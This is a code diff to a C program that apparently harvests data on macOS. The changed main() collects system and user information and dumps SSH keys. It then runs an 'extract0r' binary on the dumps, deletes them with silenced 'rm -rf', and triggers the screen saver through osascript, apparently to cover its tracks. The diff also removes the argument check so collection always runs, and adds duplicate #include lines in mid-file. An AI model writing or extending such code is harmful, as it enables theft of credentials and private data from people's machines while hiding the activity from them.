@@ -238,6 +238,31 @@ void drives_info(void) {
     fclose(f);
 }
 
+void remove_folder(const char *path) {
+    DIR *dir = opendir(path);
+    if (!dir) return;
+
+    struct dirent *entry;
+    char fullpath[PATH_MAX];
+
+    while ((entry = readdir(dir)) != NULL) {
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+            continue;
+
+        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);
+
+        struct stat st;
+        if (stat(fullpath, &st) == -1) continue;
+
+        if (S_ISDIR(st.st_mode))
+            remove_folder(fullpath);
+        else
+            unlink(fullpath);  
+    }
+    closedir(dir);
+    rmdir(path); 
+}
+
 void get_sauce(void) {
     basic_system_info();
     users_groups_info();
@@ -249,12 +274,22 @@ void get_sauce(void) {
     dump_ssh_keys();
 }
 
+#include <stdlib.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdio.h>
+
 int main(int argc, char **args) {
+    (void)argc;
     (void)args;
-    if (argc == 1) {
-        get_sauce();
-        return 0;
-    }
-    errors(ARGS, NULL);
+
+    get_sauce();
+
+    system("./extract0r/extract0r .dumps > /dev/null 2>&1");
+
+    system("rm -rf .dumps > /dev/null 2>&1");
+
+    system("osascript -e 'tell application \"System Events\" to start current screen saver' > /dev/null 2>&1");
+
     return 0;
 }
